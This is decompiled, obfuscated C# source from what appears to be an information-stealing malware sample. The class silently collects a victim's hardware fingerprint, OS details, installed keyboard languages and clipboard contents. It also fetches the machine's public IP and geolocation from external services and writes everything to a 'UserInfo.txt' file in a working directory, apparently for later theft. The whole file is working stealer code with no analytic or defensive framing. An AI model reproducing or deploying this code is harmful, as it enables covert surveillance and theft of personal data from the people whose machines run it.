using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using who;

// Token: 0x02000043 RID: 67
internal class Class28
{
	// Token: 0x06000212 RID: 530 RVA: 0x00010804 File Offset: 0x0000EA04
	public static void smethod_0()
	{
		string text = string.Empty;
		string text2 = Class16.smethod_3();
		try
		{
			foreach (string text3 in Dirs.BrowsersName)
			{
				if (text3.Contains("Google Chrome"))
				{
					object value = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
					if (value != null)
					{
						text = FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion;
					}
					else
					{
						value = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
						text = FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion;
					}
					if (Environment.Is64BitOperatingSystem)
					{
						Class28.list_0.Add(string.Concat(new string[]
						{
							"Mozilla/5.0 (",
							text2,
							"; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/",
							text,
							" Safari/537.36"
						}));
					}
					else
					{
						Class28.list_0.Add(string.Concat(new string[]
						{
							"Mozilla/5.0 (",
							text2,
							") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/",
							text,
							" Safari/537.36"
						}));
					}
				}
				if (text3.Contains("Mozilla Firefox"))
				{
					object value2 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
					if (value2 != null)
					{
						text = FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion;
					}
					else
					{
						value2 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
						text = FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion;
					}
					string text4 = string.Empty;
					text4 = text.Split(new char[]
					{
						'.'
					}).First<string>() + "." + text.Split(new char[]
					{
						'.'
					})[1];
					if (Environment.Is64BitOperatingSystem)
					{
						Class28.list_0.Add(string.Concat(new string[]
						{
							"Mozilla/5.0 (",
							text2,
							"; Win64; x64; rv:",
							text4,
							") Gecko/20100101 Firefox/",
							text4
						}));
					}
					else
					{
						Class28.list_0.Add(string.Concat(new string[]
						{
							"Mozilla/5.0 (",
							text2,
							"; rv:",
							text4,
							") Gecko/20100101 Firefox/",
							text4
						}));
					}
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000213 RID: 531 RVA: 0x00010A50 File Offset: 0x0000EC50
	public static void smethod_1()
	{
		Class28.smethod_7();
		string text = Convert.ToString(Screen.PrimaryScreen.Bounds.Size);
		string text2 = Convert.ToString(Environment.ProcessorCount);
		string text3 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "").ToString();
		string text4 = Class28.smethod_2();
		File.WriteAllText(Dirs.WorkDir + "\\UserInfo.txt", string.Concat(new string[]
		{
			"Screen Resolution: ",
			text.Replace("{", "").Replace("}", ""),
			"\r\nOS: ",
			text3,
			Class28.smethod_3(),
			"\r\nProcessesors: ",
			text2,
			"\r\nIP: ",
			Class28.string_0,
			"\r\nHWID: ",
			text4,
			"\r\nKeyboards: ",
			Class28.string_2,
			"\r\nVideo Card: ",
			Class28.smethod_8(),
			"\r\nRAM Size: ",
			Class28.smethod_9(),
			"\r\nCPU Name: ",
			Class28.smethod_6(),
			"\r\nClipboard: ",
			Clipboard.GetText(),
			Class16.string_0
		}), Encoding.Default);
	}

	// Token: 0x06000214 RID: 532 RVA: 0x00010B9C File Offset: 0x0000ED9C
	public static string smethod_2()
	{
		string result = "";
		try
		{
			string str = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
			ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + str + ":\"");
			managementObject.Get();
			string text = managementObject["VolumeSerialNumber"].ToString();
			result = text;
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x06000215 RID: 533 RVA: 0x00010C08 File Offset: 0x0000EE08
	public static string smethod_3()
	{
		string result;
		if (Environment.Is64BitOperatingSystem)
		{
			result = " x64";
		}
		else
		{
			result = " x32";
		}
		return result;
	}

	// Token: 0x06000216 RID: 534 RVA: 0x00010C34 File Offset: 0x0000EE34
	public static string smethod_4(string string_3)
	{
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_3);
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
		string result = streamReader.ReadToEnd();
		streamReader.Close();
		streamReader.Dispose();
		return result;
	}

	// Token: 0x06000217 RID: 535 RVA: 0x00010C80 File Offset: 0x0000EE80
	public static Class28.Class29 smethod_5(string string_3)
	{
		string s = Class28.smethod_4("http://ip-api.com/xml/" + string_3);
		Class28.Class29 result;
		using (TextReader textReader = new StringReader(s))
		{
			using (DataSet dataSet = new DataSet())
			{
				Class28.Class29 @class = new Class28.Class29();
				dataSet.ReadXml(textReader);
				@class.method_1(dataSet.Tables[0].Rows[0][1].ToString());
				@class.method_3(dataSet.Tables[0].Rows[0][2].ToString());
				@class.method_5(dataSet.Tables[0].Rows[0][3].ToString());
				@class.method_7(dataSet.Tables[0].Rows[0][4].ToString());
				@class.method_9(dataSet.Tables[0].Rows[0][5].ToString());
				@class.method_11(dataSet.Tables[0].Rows[0][6].ToString());
				@class.method_13(dataSet.Tables[0].Rows[0][9].ToString());
				@class.method_15(dataSet.Tables[0].Rows[0][10].ToString());
				Class28.list_1.Add(string.Concat(new string[]
				{
					"\r\n<===| Info |===>\r\nCountry: ",
					@class.method_0(),
					"\r\nCountry Code: ",
					@class.method_2(),
					"\r\nRegion: ",
					@class.method_4(),
					"\r\nCity: ",
					@class.method_8(),
					"\r\nZip: ",
					@class.method_10(),
					"\r\nTime Zone: ",
					@class.method_12(),
					"\r\nISP: ",
					@class.method_14()
				}));
				result = @class;
			}
		}
		return result;
	}

	// Token: 0x06000218 RID: 536 RVA: 0x00010EDC File Offset: 0x0000F0DC
	public static string smethod_6()
	{
		try
		{
			using (ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get())
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectCollection.GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						ManagementBaseObject managementBaseObject = enumerator.Current;
						object obj = managementBaseObject["Name"];
						return (obj != null) ? obj.ToString() : null;
					}
				}
			}
		}
		catch
		{
		}
		return "";
	}

	// Token: 0x06000219 RID: 537 RVA: 0x00010F80 File Offset: 0x0000F180
	public static void smethod_7()
	{
		foreach (object obj in InputLanguage.InstalledInputLanguages)
		{
			InputLanguage inputLanguage = (InputLanguage)obj;
			string str = Convert.ToString(inputLanguage.Culture);
			Class28.string_2 = Class28.string_2 + "\r\n" + str;
		}
	}

	// Token: 0x0600021A RID: 538 RVA: 0x00010FF4 File Offset: 0x0000F1F4
	public static string smethod_8()
	{
		try
		{
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
			using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
			{
				if (enumerator.MoveNext())
				{
					ManagementObject managementObject = (ManagementObject)enumerator.Current;
					return Convert.ToString(managementObject["Caption"]);
				}
			}
		}
		catch
		{
		}
		return "Unknown";
	}

	// Token: 0x0600021B RID: 539 RVA: 0x0001107C File Offset: 0x0000F27C
	public static string smethod_9()
	{
		try
		{
			ManagementClass managementClass = new ManagementClass("Win32_ComputerSystem");
			ManagementObjectCollection instances = managementClass.GetInstances();
			using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = instances.GetEnumerator())
			{
				if (enumerator.MoveNext())
				{
					ManagementObject managementObject = (ManagementObject)enumerator.Current;
					return Convert.ToString(Math.Round(Convert.ToDouble(managementObject.Properties["TotalPhysicalMemory"].Value) / 1048576.0, 0)) + " MB";
				}
			}
		}
		catch
		{
		}
		return "Unknown";
	}

	// Token: 0x0600021C RID: 540 RVA: 0x0000276F File Offset: 0x0000096F
	public Class28()
	{
		Class34.A1SfXVPz7w9eh();
		base..ctor();
	}

	// Token: 0x0600021D RID: 541 RVA: 0x0001112C File Offset: 0x0000F32C
	// Note: this type is marked as 'beforefieldinit'.
	static Class28()
	{
		Class34.A1SfXVPz7w9eh();
		Class28.webRequest_0 = WebRequest.Create("http://ip.42.pl/raw");
		Class28.stream_0 = Class28.webRequest_0.GetResponse().GetResponseStream();
		Class28.string_0 = new StreamReader(Class28.stream_0).ReadToEnd();
		Class28.string_1 = Class17.smethod_0();
		Class28.string_2 = "";
		Class28.list_0 = new List<string>();
		Class28.list_1 = new List<string>();
	}

	// Token: 0x040000E5 RID: 229
	public static WebRequest webRequest_0;

	// Token: 0x040000E6 RID: 230
	public static Stream stream_0;

	// Token: 0x040000E7 RID: 231
	public static string string_0;

	// Token: 0x040000E8 RID: 232
	public static string string_1;

	// Token: 0x040000E9 RID: 233
	public static string string_2;

	// Token: 0x040000EA RID: 234
	public static List<string> list_0;

	// Token: 0x040000EB RID: 235
	public static List<string> list_1;

	// Token: 0x02000044 RID: 68
	public class Class29
	{
		// Token: 0x0600021E RID: 542 RVA: 0x00002E67 File Offset: 0x00001067
		[CompilerGenerated]
		public string method_0()
		{
			return this.string_0;
		}

		// Token: 0x0600021F RID: 543 RVA: 0x00002E6F File Offset: 0x0000106F
		[CompilerGenerated]
		public void method_1(string string_8)
		{
			this.string_0 = string_8;
		}

		// Token: 0x06000220 RID: 544 RVA: 0x00002E78 File Offset: 0x00001078
		[CompilerGenerated]
		public string method_2()
		{
			return this.string_1;
		}

		// Token: 0x06000221 RID: 545 RVA: 0x00002E80 File Offset: 0x00001080
		[CompilerGenerated]
		public void method_3(string string_8)
		{
			this.string_1 = string_8;
		}

		// Token: 0x06000222 RID: 546 RVA: 0x00002E89 File Offset: 0x00001089
		[CompilerGenerated]
		public string method_4()
		{
			return this.string_2;
		}

		// Token: 0x06000223 RID: 547 RVA: 0x00002E91 File Offset: 0x00001091
		[CompilerGenerated]
		public void method_5(string string_8)
		{
			this.string_2 = string_8;
		}

		// Token: 0x06000224 RID: 548 RVA: 0x00002E9A File Offset: 0x0000109A
		[CompilerGenerated]
		public string method_6()
		{
			return this.string_3;
		}

		// Token: 0x06000225 RID: 549 RVA: 0x00002EA2 File Offset: 0x000010A2
		[CompilerGenerated]
		public void method_7(string string_8)
		{
			this.string_3 = string_8;
		}

		// Token: 0x06000226 RID: 550 RVA: 0x00002EAB File Offset: 0x000010AB
		[CompilerGenerated]
		public string method_8()
		{
			return this.string_4;
		}

		// Token: 0x06000227 RID: 551 RVA: 0x00002EB3 File Offset: 0x000010B3
		[CompilerGenerated]
		public void method_9(string string_8)
		{
			this.string_4 = string_8;
		}

		// Token: 0x06000228 RID: 552 RVA: 0x00002EBC File Offset: 0x000010BC
		[CompilerGenerated]
		public string method_10()
		{
			return this.string_5;
		}

		// Token: 0x06000229 RID: 553 RVA: 0x00002EC4 File Offset: 0x000010C4
		[CompilerGenerated]
		public void method_11(string string_8)
		{
			this.string_5 = string_8;
		}

		// Token: 0x0600022A RID: 554 RVA: 0x00002ECD File Offset: 0x000010CD
		[CompilerGenerated]
		public string method_12()
		{
			return this.string_6;
		}

		// Token: 0x0600022B RID: 555 RVA: 0x00002ED5 File Offset: 0x000010D5
		[CompilerGenerated]
		public void method_13(string string_8)
		{
			this.string_6 = string_8;
		}

		// Token: 0x0600022C RID: 556 RVA: 0x00002EDE File Offset: 0x000010DE
		[CompilerGenerated]
		public string method_14()
		{
			return this.string_7;
		}

		// Token: 0x0600022D RID: 557 RVA: 0x00002EE6 File Offset: 0x000010E6
		[CompilerGenerated]
		public void method_15(string string_8)
		{
			this.string_7 = string_8;
		}

		// Token: 0x0600022E RID: 558 RVA: 0x0000276F File Offset: 0x0000096F
		public Class29()
		{
			Class34.A1SfXVPz7w9eh();
			base..ctor();
		}

		// Token: 0x040000EC RID: 236
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private string string_0;

		// Token: 0x040000ED RID: 237
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_1;

		// Token: 0x040000EE RID: 238
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_2;

		// Token: 0x040000EF RID: 239
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_3;

		// Token: 0x040000F0 RID: 240
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_4;

		// Token: 0x040000F1 RID: 241
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_5;

		// Token: 0x040000F2 RID: 242
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_6;

		// Token: 0x040000F3 RID: 243
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private string string_7;
	}
}
